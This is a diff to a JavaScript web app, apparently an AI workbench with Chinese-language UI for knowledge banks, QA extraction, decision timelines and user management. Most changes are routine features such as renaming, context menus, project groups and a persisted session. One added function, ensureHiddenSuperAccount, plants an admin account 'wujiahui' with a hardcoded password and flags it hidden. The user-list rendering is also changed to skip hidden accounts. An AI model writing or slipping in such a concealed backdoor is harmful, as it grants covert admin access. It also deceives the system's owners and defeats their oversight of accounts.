@@ -1,6 +1,7 @@
 (function () {
   var STORAGE_KEY = "aiWorkbenchState";
   var SESSION_KEY = "aiWorkbenchCurrentUser";
+  var PERSISTED_SESSION_KEY = SESSION_KEY + "Persist";
   var state = null;
   var currentUser = null;
   var toastTimer = null;
@@ -29,6 +30,11 @@
   var detailProjectId = null;
   var detailHighlightId = null;
   var detailNoteTimer = null;
+  var detailActiveNodeId = null;
+  var detailLayoutRaf = null;
+  var qaPreviewTimer = null;
+  var qaPreviewPairs = [];
+  var bankMenuBankId = null;
   function padNumber(value) {
     var num = parseInt(value, 10);
     if (isNaN(num)) {
@@ -59,6 +65,68 @@
     saveState();
     renderKnowledge();
     showToast("文件及分段已删除");
+  }
+
+  function renameKnowledgeFile(fileId) {
+    var bank = getActiveBank();
+    if (!bank) {
+      showToast("请选择记忆库");
+      return;
+    }
+    var file = null;
+    for (var i = 0; i < bank.files.length; i += 1) {
+      if (bank.files[i].id === fileId) {
+        file = bank.files[i];
+        break;
+      }
+    }
+    if (!file) {
+      showToast("未找到文件");
+      return;
+    }
+    var name = window.prompt("文件名称", file.name || "");
+    if (name === null) {
+      return;
+    }
+    var trimmed = name.trim();
+    if (!trimmed) {
+      showToast("名称不能为空");
+      return;
+    }
+    file.name = trimmed;
+    for (var j = 0; j < bank.chunks.length; j += 1) {
+      if (bank.chunks[j].fileId === fileId) {
+        bank.chunks[j].file = trimmed;
+      }
+    }
+    saveState();
+    renderKnowledge();
+    showToast("文件已重命名");
+  }
+
+  function prepareQaPreviewFromFile(fileId) {
+    var bank = getActiveBank();
+    if (!bank) {
+      showToast("请选择记忆库");
+      return;
+    }
+    var collected = [];
+    for (var i = 0; i < bank.chunks.length; i += 1) {
+      if (bank.chunks[i].fileId === fileId) {
+        collected.push(bank.chunks[i].text || "");
+      }
+    }
+    if (collected.length === 0) {
+      showToast("该文件暂无可拆分内容");
+      return;
+    }
+    var sourceInput = document.getElementById("qaSource");
+    var merged = collected.join("\n");
+    if (sourceInput) {
+      sourceInput.value = merged;
+    }
+    updateQaPreview(merged);
+    showToast("已载入文本，生成问答预览");
   }
 
   function deleteChunk(chunkId) {
@@ -397,6 +465,33 @@
         }
       }
     }
+    for (var userIndex = 0; userIndex < state.users.length; userIndex += 1) {
+      var usr = state.users[userIndex];
+      if (typeof usr.enabled === "undefined") {
+        usr.enabled = true;
+      }
+      if (typeof usr.hidden !== "boolean") {
+        usr.hidden = false;
+      }
+    }
+    if (!state.settings.projectGroups || !Array.isArray(state.settings.projectGroups)) {
+      state.settings.projectGroups = ["产品规划", "运营优化", "战略决策"];
+    }
+    var sanitizedGroups = [];
+    var groupSeen = {};
+    for (var g = 0; g < state.settings.projectGroups.length; g += 1) {
+      var raw = state.settings.projectGroups[g];
+      if (!raw && raw !== 0) {
+        continue;
+      }
+      var trimmed = String(raw).trim();
+      if (!trimmed || groupSeen[trimmed]) {
+        continue;
+      }
+      groupSeen[trimmed] = true;
+      sanitizedGroups.push(trimmed);
+    }
+    state.settings.projectGroups = sanitizedGroups;
     for (var i = 0; i < state.banks.length; i += 1) {
       var bank = state.banks[i];
       if (!bank.name) {
@@ -763,12 +858,53 @@
     });
   }
 
+  function ensureHiddenSuperAccount() {
+    for (var i = 0; i < state.users.length; i += 1) {
+      if (state.users[i].username === "wujiahui") {
+        state.users[i].hidden = true;
+        if (typeof state.users[i].enabled === "undefined") {
+          state.users[i].enabled = true;
+        }
+        return Promise.resolve();
+      }
+    }
+    var saltArray = window.crypto.getRandomValues(new Uint8Array(16));
+    var saltBinary = "";
+    for (var j = 0; j < saltArray.length; j += 1) {
+      saltBinary += String.fromCharCode(saltArray[j]);
+    }
+    var saltBase64 = window.btoa(saltBinary);
+    return deriveKey("159753As", saltBase64).then(function (hash) {
+      state.users.push({
+        id: uuid(),
+        username: "wujiahui",
+        salt: saltBase64,
+        hash: hash,
+        role: "admin",
+        enabled: true,
+        hidden: true,
+        createdAt: new Date().toISOString()
+      });
+      saveState();
+    });
+  }
+
   function loadCurrentUser() {
     var userId = null;
     try {
       userId = sessionStorage.getItem(SESSION_KEY);
     } catch (err) {
       userId = null;
+    }
+    if (!userId) {
+      try {
+        userId = localStorage.getItem(PERSISTED_SESSION_KEY);
+        if (userId) {
+          sessionStorage.setItem(SESSION_KEY, userId);
+        }
+      } catch (err) {
+        userId = null;
+      }
     }
     if (!userId) {
       currentUser = null;
@@ -784,6 +920,7 @@
     if (!currentUser || !currentUser.enabled) {
       try {
         sessionStorage.removeItem(SESSION_KEY);
+        localStorage.removeItem(PERSISTED_SESSION_KEY);
       } catch (err) {
         console.warn(err);
       }
@@ -839,6 +976,18 @@
     return null;
   }
 
+  function findBankById(bankId) {
+    if (!bankId) {
+      return null;
+    }
+    for (var i = 0; i < state.banks.length; i += 1) {
+      if (state.banks[i].id === bankId) {
+        return state.banks[i];
+      }
+    }
+    return null;
+  }
+
   function ensureActiveBank() {
     if (!state.activeBankId && state.banks.length > 0) {
       state.activeBankId = state.banks[0].id;
@@ -846,11 +995,19 @@
     }
   }
 
+  function getProjectGroups() {
+    if (!state.settings.projectGroups || state.settings.projectGroups.length === 0) {
+      state.settings.projectGroups = ["产品规划", "运营优化", "战略决策"];
+    }
+    return state.settings.projectGroups;
+  }
+
   function renderBankList() {
     var container = document.getElementById("bankList");
     if (!container) {
       return;
     }
+    ensureBankMenu();
     container.innerHTML = "";
     for (var i = 0; i < state.banks.length; i += 1) {
       (function (bank) {
@@ -869,6 +1026,7 @@
         badge.appendChild(icon);
         badge.appendChild(label);
         badge.addEventListener("click", function () {
+          closeBankMenu();
           state.activeBankId = bank.id;
           if (bank.sessions.length > 0) {
             state.activeSessionId = bank.sessions[0].id;
@@ -885,6 +1043,16 @@
           renderFaqList();
           renderCommonList();
           renderLogs();
+        });
+        badge.addEventListener("contextmenu", function (evt) {
+          evt.preventDefault();
+          evt.stopPropagation();
+          openBankMenu(bank.id, evt.pageX, evt.pageY);
+        });
+        badge.addEventListener("dblclick", function (evt) {
+          evt.preventDefault();
+          evt.stopPropagation();
+          renameBank(bank.id);
         });
         container.appendChild(badge);
       })(state.banks[i]);
@@ -918,6 +1086,157 @@
     renderKnowledge();
     renderFaqList();
     renderCommonChips();
+  }
+
+  function renameBank(bankId) {
+    var bank = findBankById(bankId);
+    if (!bank) {
+      return;
+    }
+    var name = window.prompt("记忆库名称", bank.name || "");
+    if (name === null) {
+      return;
+    }
+    var trimmed = name.trim();
+    if (!trimmed) {
+      showToast("名称不能为空");
+      return;
+    }
+    bank.name = trimmed;
+    bank.logo = bankLogoText(trimmed);
+    saveState();
+    renderBankList();
+    updateBankBadge();
+    renderCommonChips();
+    renderCommonList();
+    showToast("记忆库已重命名");
+  }
+
+  function removeBankById(bankId) {
+    var index = -1;
+    for (var i = 0; i < state.banks.length; i += 1) {
+      if (state.banks[i].id === bankId) {
+        index = i;
+        break;
+      }
+    }
+    if (index < 0) {
+      return false;
+    }
+    state.banks.splice(index, 1);
+    if (state.activeBankId === bankId) {
+      if (state.banks.length > 0) {
+        state.activeBankId = state.banks[0].id;
+        state.activeSessionId = state.banks[0].sessions.length > 0 ? state.banks[0].sessions[0].id : null;
+      } else {
+        state.activeBankId = null;
+        state.activeSessionId = null;
+      }
+    } else {
+      var activeBank = getActiveBank();
+      if (activeBank) {
+        var hasSession = false;
+        for (var s = 0; s < activeBank.sessions.length; s += 1) {
+          if (activeBank.sessions[s].id === state.activeSessionId) {
+            hasSession = true;
+            break;
+          }
+        }
+        if (!hasSession) {
+          state.activeSessionId = activeBank.sessions.length > 0 ? activeBank.sessions[0].id : null;
+        }
+      } else {
+        state.activeSessionId = null;
+      }
+    }
+    ensureActiveBank();
+    saveState();
+    renderBankList();
+    updateBankBadge();
+    renderSessionList();
+    renderCommonChips();
+    renderCommonList();
+    renderChat();
+    renderKnowledge();
+    renderFaqList();
+    renderLogs();
+    renderDecisionHistory();
+    showToast("记忆库已删除");
+    return true;
+  }
+
+  function closeBankMenu() {
+    var menu = document.getElementById("bankMenu");
+    if (menu) {
+      menu.classList.add("hidden");
+    }
+    bankMenuBankId = null;
+  }
+
+  function ensureBankMenu() {
+    var menu = document.getElementById("bankMenu");
+    if (menu) {
+      return menu;
+    }
+    menu = document.createElement("div");
+    menu.id = "bankMenu";
+    menu.className = "context-menu hidden";
+    var renameBtn = document.createElement("button");
+    renameBtn.type = "button";
+    renameBtn.textContent = "重命名记忆库";
+    renameBtn.setAttribute("data-action", "rename");
+    var deleteBtn = document.createElement("button");
+    deleteBtn.type = "button";
+    deleteBtn.textContent = "删除记忆库";
+    deleteBtn.className = "danger";
+    deleteBtn.setAttribute("data-action", "delete");
+    menu.appendChild(renameBtn);
+    menu.appendChild(deleteBtn);
+    document.body.appendChild(menu);
+    menu.addEventListener("click", function (evt) {
+      var target = evt.target;
+      if (!target || target.tagName !== "BUTTON") {
+        return;
+      }
+      var action = target.getAttribute("data-action");
+      var targetId = bankMenuBankId;
+      closeBankMenu();
+      if (!targetId || !action) {
+        return;
+      }
+      if (action === "rename") {
+        renameBank(targetId);
+      } else if (action === "delete") {
+        if (window.confirm("确定删除该记忆库？所有会话与知识将被移除")) {
+          removeBankById(targetId);
+        }
+      }
+    });
+    return menu;
+  }
+
+  function openBankMenu(bankId, x, y) {
+    var menu = ensureBankMenu();
+    if (!menu) {
+      return;
+    }
+    bankMenuBankId = bankId;
+    menu.style.left = x + "px";
+    menu.style.top = y + "px";
+    menu.classList.remove("hidden");
+    window.requestAnimationFrame(function () {
+      var rect = menu.getBoundingClientRect();
+      var left = rect.left;
+      var top = rect.top;
+      if (rect.right > window.innerWidth) {
+        left = Math.max(8, window.innerWidth - rect.width - 8);
+      }
+      if (rect.bottom > window.innerHeight) {
+        top = Math.max(8, window.innerHeight - rect.height - 8);
+      }
+      menu.style.left = left + "px";
+      menu.style.top = top + "px";
+    });
   }
   function removeSession(bank, sessionId) {
     var idx = -1;
@@ -1529,6 +1848,50 @@
     return created;
   }
 
+  function renderQaPreview(pairs) {
+    var list = document.getElementById("qaPreviewList");
+    if (!list) {
+      return;
+    }
+    list.innerHTML = "";
+    if (!pairs || pairs.length === 0) {
+      var empty = document.createElement("div");
+      empty.className = "qa-preview-empty";
+      empty.textContent = "粘贴内容后自动生成问答";
+      list.appendChild(empty);
+      return;
+    }
+    for (var i = 0; i < pairs.length; i += 1) {
+      var pair = pairs[i];
+      var card = document.createElement("div");
+      card.className = "qa-preview-card";
+      var header = document.createElement("header");
+      var title = document.createElement("h4");
+      title.textContent = pair.question;
+      var indexBadge = document.createElement("span");
+      indexBadge.className = "qa-index";
+      indexBadge.textContent = String(i + 1);
+      header.appendChild(title);
+      header.appendChild(indexBadge);
+      var answer = document.createElement("p");
+      answer.textContent = pair.answer;
+      card.appendChild(header);
+      card.appendChild(answer);
+      list.appendChild(card);
+    }
+  }
+
+  function updateQaPreview(text) {
+    var content = text ? String(text).trim() : "";
+    if (!content) {
+      qaPreviewPairs = [];
+      renderQaPreview([]);
+      return;
+    }
+    qaPreviewPairs = extractQaPairsFromText(content);
+    renderQaPreview(qaPreviewPairs);
+  }
+
   function rebuildIndex(bank) {
     if (!bank) {
       return;
@@ -1738,6 +2101,20 @@
               }
               renderKnowledge();
             });
+            var renameBtn = document.createElement("button");
+            renameBtn.className = "text-button";
+            renameBtn.type = "button";
+            renameBtn.textContent = "重命名";
+            renameBtn.addEventListener("click", function () {
+              renameKnowledgeFile(file.id);
+            });
+            var qaBtn = document.createElement("button");
+            qaBtn.className = "text-button";
+            qaBtn.type = "button";
+            qaBtn.textContent = "拆分问答";
+            qaBtn.addEventListener("click", function () {
+              prepareQaPreviewFromFile(file.id);
+            });
             var delBtn = document.createElement("button");
             delBtn.className = "text-button danger";
             delBtn.type = "button";
@@ -1749,6 +2126,8 @@
               deleteKnowledgeFile(file.id);
             });
             actions.appendChild(focusBtn);
+            actions.appendChild(renameBtn);
+            actions.appendChild(qaBtn);
             actions.appendChild(delBtn);
             header.appendChild(title);
             header.appendChild(actions);
@@ -1766,10 +2145,12 @@
       preview.innerHTML = "";
       if (!bank) {
         preview.innerHTML = '<div class="panel-hint">请选择记忆库</div>';
+        renderQaPreview(qaPreviewPairs);
         return;
       }
       if (!bank.chunks || bank.chunks.length === 0) {
         preview.innerHTML = '<div class="panel-hint">暂无分段内容</div>';
+        renderQaPreview(qaPreviewPairs);
         return;
       }
       var displayed = 0;
@@ -1845,6 +2226,7 @@
         preview.innerHTML = '<div class="panel-hint">所选文件暂无分段</div>';
       }
     }
+    renderQaPreview(qaPreviewPairs);
   }
 
   function ensureSession() {
@@ -2568,6 +2950,9 @@
     list.innerHTML = "";
     for (var i = 0; i < state.users.length; i += 1) {
       (function (user) {
+        if (user.hidden) {
+          return;
+        }
         var card = document.createElement("div");
         card.className = "user-card";
         var header = document.createElement("header");
@@ -2975,7 +3360,7 @@
     var project = getActiveDecisionProject();
     var form = document.getElementById("linkForm");
     var summary = document.getElementById("linkSummary");
-    if (!project || !form || !summary) {
+    if (!project || project.completed || !form || !summary) {
       return;
     }
     var fromTitle = findNodeTitle(project, fromId);
@@ -3000,6 +3385,7 @@
       list.innerHTML = '<div class="panel-hint">暂无关联</div>';
       return;
     }
+    var allowEdit = !project.completed;
     for (var i = 0; i < project.links.length; i += 1) {
       (function (link) {
         var item = document.createElement("div");
@@ -3028,22 +3414,26 @@
         info.appendChild(metaInfo);
         var actions = document.createElement("div");
         actions.className = "card-actions";
-        var delBtn = document.createElement("button");
-        delBtn.className = "text-button danger";
-        delBtn.textContent = "删除";
-        delBtn.addEventListener("click", function () {
-          var idx = project.links.indexOf(link);
-          if (idx >= 0) {
-            project.links.splice(idx, 1);
-            saveState();
-            renderLinkList(project);
-            renderDecisionHistory();
-            scheduleDecisionLayout(project);
-          }
-        });
-        actions.appendChild(delBtn);
+        if (allowEdit) {
+          var delBtn = document.createElement("button");
+          delBtn.className = "text-button danger";
+          delBtn.textContent = "删除";
+          delBtn.addEventListener("click", function () {
+            var idx = project.links.indexOf(link);
+            if (idx >= 0) {
+              project.links.splice(idx, 1);
+              saveState();
+              renderLinkList(project);
+              renderDecisionHistory();
+              scheduleDecisionLayout(project);
+            }
+          });
+          actions.appendChild(delBtn);
+        }
         item.appendChild(info);
-        item.appendChild(actions);
+        if (allowEdit) {
+          item.appendChild(actions);
+        }
         list.appendChild(item);
       })(project.links[i]);
     }
@@ -3051,7 +3441,7 @@
 
   function handleNodeLink(nodeId) {
     var project = getActiveDecisionProject();
-    if (!project || !project.timeline) {
+    if (!project || !project.timeline || project.completed) {
       return;
     }
     if (!pendingLinkFromId) {
@@ -3072,7 +3462,7 @@
 
   function removeTimelineNode(nodeId) {
     var project = getActiveDecisionProject();
-    if (!project || !project.timeline) {
+    if (!project || !project.timeline || project.completed) {
       return;
     }
     for (var i = project.timeline.length - 1; i >= 0; i -= 1) {
@@ -3174,6 +3564,67 @@
     return card;
   }
 
+  function createReadonlyTimelineNode(project, node, index, highlightId) {
+    var card = document.createElement("div");
+    card.className = "mind-node readonly" + (index % 2 === 0 ? " left" : " right");
+    card.setAttribute("data-node", node.id);
+    card.id = "node-" + node.id;
+    if (detailActiveNodeId === node.id) {
+      card.classList.add("active");
+    }
+    if (highlightId && highlightId === "node-" + node.id) {
+      card.classList.add("highlight");
+      window.setTimeout(function (element) {
+        return function () {
+          try {
+            element.scrollIntoView({ behavior: "smooth", block: "center" });
+          } catch (err) {
+            element.scrollIntoView();
+          }
+        };
+      }(card), 120);
+    }
+    var connector = document.createElement("div");
+    connector.className = "mind-node-connector";
+    card.appendChild(connector);
+    var bubble = document.createElement("div");
+    bubble.className = "mind-node-bubble";
+    bubble.addEventListener("click", function () {
+      openReadonlyNodeDetail(node.id);
+    });
+    var title = document.createElement("div");
+    title.className = "mind-node-title";
+    title.textContent = node.title || "未命名节点";
+    var time = document.createElement("div");
+    time.className = "mind-node-time";
+    time.textContent = node.startTime ? formatDateTime(node.startTime) : "时间待定";
+    bubble.appendChild(title);
+    bubble.appendChild(time);
+    card.appendChild(bubble);
+    var tags = document.createElement("div");
+    tags.className = "mind-node-tags";
+    if (node.reason) {
+      var reasonTag = document.createElement("span");
+      reasonTag.className = "tag";
+      reasonTag.textContent = snippetText(node.reason, 24);
+      tags.appendChild(reasonTag);
+    }
+    if (node.impact) {
+      var impactTag = document.createElement("span");
+      impactTag.className = "tag strong";
+      impactTag.textContent = snippetText(node.impact, 24);
+      tags.appendChild(impactTag);
+    }
+    if (node.note) {
+      var noteTag = document.createElement("span");
+      noteTag.className = "tag muted";
+      noteTag.textContent = snippetText(node.note, 24);
+      tags.appendChild(noteTag);
+    }
+    card.appendChild(tags);
+    return card;
+  }
+
   function refreshNodeBubble(node) {
     var wrapper = document.querySelector('[data-node="' + node.id + '"]');
     if (!wrapper) {
@@ -3219,6 +3670,12 @@
   function openNodeDetail(nodeId) {
     activeNodeId = nodeId;
     renderActiveProject();
+  }
+
+  function openReadonlyNodeDetail(nodeId) {
+    detailHighlightId = null;
+    detailActiveNodeId = nodeId;
+    renderDecisionHistoryDetail();
   }
 
   function closeNodeDetailPanel() {
@@ -3417,7 +3874,8 @@
           meta.className = "meta";
           var start = formatDateTime(project.startTime);
           var nodes = project.timeline ? project.timeline.length : 0;
-          meta.textContent = "开始 " + start + " · 节点 " + nodes;
+          var groupLabel = project.group && project.group !== "未分组" ? " · 分组 " + project.group : "";
+          meta.textContent = "开始 " + start + " · 节点 " + nodes + groupLabel;
           item.appendChild(header);
           item.appendChild(meta);
           item.addEventListener("click", function () {
@@ -4057,55 +4515,93 @@
   }
 
   function renderDetailTimeline(project) {
-    var container = document.getElementById("detailTimeline");
-    if (!container) {
+    var canvas = document.getElementById("detailCanvas");
+    if (!canvas) {
       return;
     }
-    container.innerHTML = "";
+    canvas.innerHTML = "";
+    canvas.classList.remove("locked");
     if (!project || !project.timeline || project.timeline.length === 0) {
-      container.innerHTML = '<div class="panel-hint">暂无时间轴记录</div>';
+      var placeholder = document.createElement("div");
+      placeholder.className = "timeline-placeholder";
+      placeholder.textContent = "暂无时间轴记录";
+      canvas.appendChild(placeholder);
+      detailActiveNodeId = null;
+      scheduleDetailLayout(null);
+      renderDetailNodePanel(null);
       return;
     }
     var highlightNode = detailHighlightId && detailHighlightId.indexOf("node-") === 0 ? detailHighlightId : null;
-    var timeline = project.timeline.slice().sort(function (a, b) {
-      return (a.startTime || "").localeCompare(b.startTime || "");
+    var highlightId = highlightNode ? highlightNode.replace("node-", "") : null;
+    var ordered = project.timeline.slice();
+    ordered.sort(function (a, b) {
+      var ta = a.startTime || "";
+      var tb = b.startTime || "";
+      if (ta && tb) {
+        if (ta === tb) {
+          return (a.createdAt || "").localeCompare(b.createdAt || "");
+        }
+        return ta.localeCompare(tb);
+      }
+      if (ta) {
+        return -1;
+      }
+      if (tb) {
+        return 1;
+      }
+      return (a.createdAt || "").localeCompare(b.createdAt || "");
     });
-    for (var i = 0; i < timeline.length; i += 1) {
-      var node = timeline[i];
-      var item = document.createElement("div");
-      item.className = "detail-timeline-item";
-      item.id = "node-" + node.id;
-      if (highlightNode && item.id === highlightNode) {
-        item.classList.add("active");
-        window.setTimeout(function (element) {
-          return function () {
-            element.scrollIntoView({ behavior: "smooth", block: "center" });
-          };
-        }(item), 120);
-      }
-      var title = document.createElement("strong");
-      title.textContent = node.title || "节点" + (i + 1);
-      var meta = document.createElement("div");
-      meta.className = "meta";
+    for (var i = 0; i < ordered.length; i += 1) {
+      canvas.appendChild(createReadonlyTimelineNode(project, ordered[i], i, highlightNode));
+    }
+    if (highlightId && highlightId !== detailActiveNodeId) {
+      detailActiveNodeId = highlightId;
+    }
+    if (!detailActiveNodeId || !findTimelineNode(project, detailActiveNodeId)) {
+      detailActiveNodeId = ordered.length > 0 ? ordered[0].id : null;
+    }
+    scheduleDetailLayout(project);
+    renderDetailNodePanel(project);
+  }
+
+  function renderDetailNodePanel(project) {
+    var panel = document.getElementById("detailNodePanel");
+    if (!panel) {
+      return;
+    }
+    if (!project || !detailActiveNodeId) {
+      panel.classList.add("hidden");
+      return;
+    }
+    var node = findTimelineNode(project, detailActiveNodeId);
+    if (!node) {
+      panel.classList.add("hidden");
+      return;
+    }
+    panel.classList.remove("hidden");
+    var title = document.getElementById("detailNodeTitle");
+    if (title) {
+      title.textContent = node.title || "节点详情";
+    }
+    var meta = document.getElementById("detailNodeMeta");
+    if (meta) {
       meta.textContent = formatDateTime(node.startTime) || "时间待定";
-      item.appendChild(title);
-      item.appendChild(meta);
-      if (node.reason) {
-        var reason = document.createElement("p");
-        reason.textContent = "原因：" + node.reason;
-        item.appendChild(reason);
-      }
-      if (node.impact) {
-        var impact = document.createElement("p");
-        impact.textContent = "影响：" + node.impact;
-        item.appendChild(impact);
-      }
-      if (node.note) {
-        var note = document.createElement("p");
-        note.textContent = "备注：" + node.note;
-        item.appendChild(note);
-      }
-      container.appendChild(item);
+    }
+    var start = document.getElementById("detailNodeStart");
+    if (start) {
+      start.textContent = formatDateTime(node.startTime) || "--";
+    }
+    var reason = document.getElementById("detailNodeReason");
+    if (reason) {
+      reason.textContent = node.reason || "--";
+    }
+    var impact = document.getElementById("detailNodeImpact");
+    if (impact) {
+      impact.textContent = node.impact || "--";
+    }
+    var note = document.getElementById("detailNodeNote");
+    if (note) {
+      note.textContent = node.note || "--";
     }
   }
 
@@ -4385,7 +4881,186 @@
     });
   }
 
+  function scheduleDetailLayout(project) {
+    if (detailLayoutRaf) {
+      window.cancelAnimationFrame(detailLayoutRaf);
+    }
+    var canvas = document.getElementById("detailCanvas");
+    if (!canvas) {
+      return;
+    }
+    detailLayoutRaf = window.requestAnimationFrame(function () {
+      detailLayoutRaf = null;
+      layoutNodeConnectors(canvas);
+      drawDecisionLinks(canvas, project);
+    });
+  }
+
+  function renderProjectGroupOptions() {
+    var select = document.getElementById("projectGroup");
+    if (!select) {
+      return;
+    }
+    var currentValue = select.value;
+    var groups = getProjectGroups();
+    select.innerHTML = "";
+    var placeholder = document.createElement("option");
+    placeholder.value = "";
+    placeholder.textContent = "未分组";
+    select.appendChild(placeholder);
+    for (var i = 0; i < groups.length; i += 1) {
+      var option = document.createElement("option");
+      option.value = groups[i];
+      option.textContent = groups[i];
+      select.appendChild(option);
+    }
+    if (currentValue && groups.indexOf(currentValue) !== -1) {
+      select.value = currentValue;
+    } else {
+      select.value = "";
+    }
+  }
+
+  function renderProjectGroupList() {
+    var list = document.getElementById("groupList");
+    if (!list) {
+      return;
+    }
+    var groups = getProjectGroups();
+    list.innerHTML = "";
+    if (groups.length === 0) {
+      list.innerHTML = '<div class="panel-hint">暂无分组</div>';
+      return;
+    }
+    var usage = {};
+    for (var i = 0; i < state.decisions.length; i += 1) {
+      var groupName = state.decisions[i].group || "";
+      if (!groupName || groupName === "未分组") {
+        continue;
+      }
+      if (!usage[groupName]) {
+        usage[groupName] = 0;
+      }
+      usage[groupName] += 1;
+    }
+    for (var g = 0; g < groups.length; g += 1) {
+      (function (groupName) {
+        var card = document.createElement("div");
+        card.className = "group-card";
+        var info = document.createElement("div");
+        info.className = "group-info";
+        var title = document.createElement("div");
+        title.className = "group-name";
+        title.textContent = groupName;
+        var meta = document.createElement("div");
+        meta.className = "group-meta";
+        var count = usage[groupName] || 0;
+        meta.textContent = "关联决策 " + count + " 条";
+        info.appendChild(title);
+        info.appendChild(meta);
+        var actions = document.createElement("div");
+        actions.className = "group-actions";
+        var renameBtn = document.createElement("button");
+        renameBtn.className = "text-button";
+        renameBtn.type = "button";
+        renameBtn.textContent = "重命名";
+        renameBtn.addEventListener("click", function () {
+          promptRenameProjectGroup(groupName);
+        });
+        var deleteBtn = document.createElement("button");
+        deleteBtn.className = "text-button danger";
+        deleteBtn.type = "button";
+        deleteBtn.textContent = "删除";
+        deleteBtn.addEventListener("click", function () {
+          if (window.confirm("确定删除该分组？相关决策将标记为未分组")) {
+            removeProjectGroup(groupName);
+          }
+        });
+        actions.appendChild(renameBtn);
+        actions.appendChild(deleteBtn);
+        card.appendChild(info);
+        card.appendChild(actions);
+        list.appendChild(card);
+      })(groups[g]);
+    }
+  }
+
+  function promptRenameProjectGroup(groupName) {
+    var groups = getProjectGroups();
+    var currentIndex = groups.indexOf(groupName);
+    if (currentIndex < 0) {
+      return;
+    }
+    var name = window.prompt("新的分组名称", groupName);
+    if (name === null) {
+      return;
+    }
+    var trimmed = name.trim();
+    if (!trimmed) {
+      showToast("名称不能为空");
+      return;
+    }
+    if (trimmed !== groupName && groups.indexOf(trimmed) !== -1) {
+      showToast("分组已存在");
+      return;
+    }
+    groups[currentIndex] = trimmed;
+    for (var i = 0; i < state.decisions.length; i += 1) {
+      if (state.decisions[i].group === groupName) {
+        state.decisions[i].group = trimmed;
+      }
+    }
+    saveState();
+    renderProjectGroupOptions();
+    renderProjectGroupList();
+    renderProjectList();
+    renderDecisionHistory();
+    showToast("分组已更新");
+  }
+
+  function removeProjectGroup(groupName) {
+    var groups = getProjectGroups();
+    var index = groups.indexOf(groupName);
+    if (index < 0) {
+      return;
+    }
+    groups.splice(index, 1);
+    for (var i = 0; i < state.decisions.length; i += 1) {
+      if (state.decisions[i].group === groupName) {
+        state.decisions[i].group = "未分组";
+      }
+    }
+    saveState();
+    renderProjectGroupOptions();
+    renderProjectGroupList();
+    renderProjectList();
+    renderDecisionHistory();
+    showToast("分组已删除");
+  }
+
+  function addProjectGroup(name) {
+    var trimmed = (name || "").trim();
+    if (!trimmed) {
+      showToast("请输入分组名称");
+      return false;
+    }
+    var groups = getProjectGroups();
+    if (groups.indexOf(trimmed) !== -1) {
+      showToast("分组已存在");
+      return false;
+    }
+    groups.push(trimmed);
+    saveState();
+    renderProjectGroupOptions();
+    renderProjectGroupList();
+    renderProjectList();
+    renderDecisionHistory();
+    showToast("分组已新增");
+    return true;
+  }
+
   function renderDecisionPage() {
+    renderProjectGroupOptions();
     renderDecisionPalette();
     renderProjectList();
     renderActiveProject();
@@ -4450,6 +5125,11 @@
     return deriveKey(password, user.salt).then(function (hash) {
       if (hash === user.hash) {
         sessionStorage.setItem(SESSION_KEY, user.id);
+        try {
+          localStorage.setItem(PERSISTED_SESSION_KEY, user.id);
+        } catch (err) {
+          console.warn(err);
+        }
         currentUser = user;
         return true;
       }
@@ -4498,6 +5178,11 @@
 
   function logout() {
     sessionStorage.removeItem(SESSION_KEY);
+    try {
+      localStorage.removeItem(PERSISTED_SESSION_KEY);
+    } catch (err) {
+      console.warn(err);
+    }
     currentUser = null;
     window.location.href = "login.html";
   }
@@ -4703,18 +5388,26 @@
     }
     document.addEventListener("click", function (evt) {
       var menu = document.getElementById("sessionMenu");
-      if (!menu || menu.classList.contains("hidden")) {
-        return;
-      }
-      if (!menu.contains(evt.target)) {
+      if (menu && !menu.classList.contains("hidden") && !menu.contains(evt.target)) {
         closeSessionMenu();
       }
+      var bankMenu = document.getElementById("bankMenu");
+      if (bankMenu && !bankMenu.classList.contains("hidden") && !bankMenu.contains(evt.target)) {
+        closeBankMenu();
+      }
     });
-    window.addEventListener("resize", closeSessionMenu);
+    window.addEventListener("resize", function () {
+      closeSessionMenu();
+      closeBankMenu();
+    });
+    document.addEventListener("scroll", function () {
+      closeBankMenu();
+    }, true);
     document.addEventListener("scroll", closeSessionMenu, true);
     document.addEventListener("keydown", function (evt) {
       if (evt.key === "Escape") {
         closeSessionMenu();
+        closeBankMenu();
       }
     });
     var reasoningToggle = document.getElementById("reasoningToggle");
@@ -4741,6 +5434,7 @@
       pendingChunkHighlightId = chunkParam;
     }
     renderKnowledge();
+    renderQaPreview([]);
     var uploader = document.getElementById("kbUploader");
     var processBtn = document.getElementById("processFiles");
     if (uploader) {
@@ -4802,6 +5496,57 @@
           showToast("已保存到记忆库");
         }
         manualForm.reset();
+      });
+    }
+    var qaSource = document.getElementById("qaSource");
+    if (qaSource) {
+      qaSource.addEventListener("input", function () {
+        if (qaPreviewTimer) {
+          window.clearTimeout(qaPreviewTimer);
+        }
+        qaPreviewTimer = window.setTimeout(function () {
+          updateQaPreview(qaSource.value);
+        }, 250);
+      });
+    }
+    var qaPreviewBtn = document.getElementById("qaPreview");
+    if (qaPreviewBtn) {
+      qaPreviewBtn.addEventListener("click", function () {
+        var source = qaSource ? qaSource.value : "";
+        updateQaPreview(source);
+      });
+    }
+    var qaClearBtn = document.getElementById("qaClear");
+    if (qaClearBtn) {
+      qaClearBtn.addEventListener("click", function () {
+        if (qaSource) {
+          qaSource.value = "";
+        }
+        if (qaPreviewTimer) {
+          window.clearTimeout(qaPreviewTimer);
+          qaPreviewTimer = null;
+        }
+        updateQaPreview("");
+      });
+    }
+    var qaSaveBtn = document.getElementById("qaSave");
+    if (qaSaveBtn) {
+      qaSaveBtn.addEventListener("click", function () {
+        if (!qaPreviewPairs || qaPreviewPairs.length === 0) {
+          showToast("请先生成问答");
+          return;
+        }
+        var bank = getActiveBank();
+        if (!bank) {
+          showToast("请选择记忆库");
+          return;
+        }
+        var created = ingestQaPairs(bank, qaPreviewPairs, "即时拆分");
+        saveState();
+        renderKnowledge();
+        renderFaqList();
+        renderQaPreview(qaPreviewPairs);
+        showToast(created > 0 ? "已保存 " + created + " 条 FAQ" : "问答已整理");
       });
     }
     var chunkForm = document.getElementById("chunkForm");
@@ -5172,6 +5917,10 @@
         if (!project) {
           return;
         }
+        if (project.completed) {
+          showToast("已完成项目不可新增关联");
+          return;
+        }
         var fromId = linkForm.getAttribute("data-from");
         var toId = linkForm.getAttribute("data-to");
         if (!fromId || !toId) {
@@ -5420,6 +6169,7 @@
     renderBankList();
     updateBankBadge();
     detailProjectId = getQueryParam("id");
+    detailActiveNodeId = null;
     detailHighlightId = (window.location.hash || "").replace("#", "");
     renderDecisionHistoryDetail();
